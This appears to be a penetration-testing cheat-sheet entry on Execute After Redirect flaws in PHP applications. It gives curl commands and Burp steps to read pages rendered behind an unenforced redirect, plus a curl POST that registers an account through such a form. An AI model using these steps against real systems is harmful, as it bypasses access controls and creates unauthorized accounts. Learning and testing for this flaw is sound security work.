# Execute After Redirect (EAR)

When a PHP application redirects unauthorized users but does not `exit`/`die` after the redirect header, the page content is still rendered. A proxy (Burp) can intercept the 302 response and read the body.

```bash
# With curl — follow redirect suppressed, get full body
curl -s http://<TARGET>/restricted-page.php

# In Burp: intercept the 302 → change status to 200 → read page content
# Or: right-click → "Do Intercept → Response to this request"
```

To register as admin via EAR-exposed form (e.g. `/accounts.php`):
```bash
curl -s -X POST http://<TARGET>/accounts.php \
  -d 'username=attacker&password=pass123&confirm=pass123'
# Server redirects but processes the POST; account created
```
